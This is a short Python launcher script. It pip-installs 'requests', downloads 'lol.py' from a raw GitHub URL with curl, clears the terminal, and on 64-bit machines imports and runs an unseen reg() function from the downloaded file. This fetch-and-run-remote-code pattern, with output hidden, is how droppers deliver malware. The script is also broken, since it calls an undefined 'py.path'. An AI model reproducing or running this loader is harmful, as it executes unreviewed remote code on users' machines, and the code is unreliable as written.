#coding=utf-8
import os, sys, platform
try:
    import requests
except:
    os.system('pip install requests')

import requests
if not py.path.isfile('lol.py'):
    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKAR/jutt/main/lol.py > lol.py')
    os.system('clear')
bit=platform.architecture()[0]
if bit == '64bit':
    from lol import reg
    reg()
